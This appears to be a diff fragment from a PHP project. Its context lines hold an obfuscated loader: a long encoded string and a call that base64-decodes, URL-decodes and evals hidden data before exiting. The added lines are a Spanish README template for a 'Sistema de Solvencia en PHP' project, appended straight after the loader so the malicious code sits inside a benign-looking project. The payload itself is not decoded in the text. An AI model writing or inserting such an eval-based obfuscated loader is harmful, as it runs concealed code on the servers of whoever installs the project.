@@ -6,3 +6,19 @@ $uk45 = "==g+Z+fdB4rH6UrDvMDuWbXUuIDrv+vac2q486lgaOv9xajYwznPH03X9zCcwzaTb/7csxk
 eval(htmlspecialchars_decode(urldecode(base64_decode($unknown))));
 exit;
 ?>
+
+# SISTEMA DE SOLVENCIA EN PHP
+
+Breve descripción del proyecto.
+
+## Requisitos
+
+- PHP versión 8.0 o superior.
+- Composer (si aplica).
+- Extensiones necesarias (por ejemplo, `ext-mbstring`, `ext-json`).
+
+## Instalación
+
+1. Clona este repositorio:
+   ```bash
+   git clone https://github.com/usuario/proyecto.git
